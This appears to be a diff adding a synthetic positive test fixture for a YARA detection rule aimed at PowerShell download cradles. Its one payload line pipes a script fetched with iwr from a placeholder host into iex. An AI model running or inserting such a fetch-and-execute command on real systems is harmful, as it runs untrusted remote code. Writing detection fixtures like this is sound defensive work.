@@ -1,0 +1,4 @@
+Synthetic test fixture (positive) for YARA rule PowerShell_Download_Cradle.
+Inert text, never executed. Hosts use reserved documentation names (example.invalid) and addresses (192.0.2.0/24).
+
+iwr -UseBasicParsing https://example.invalid/install.ps1 | iex
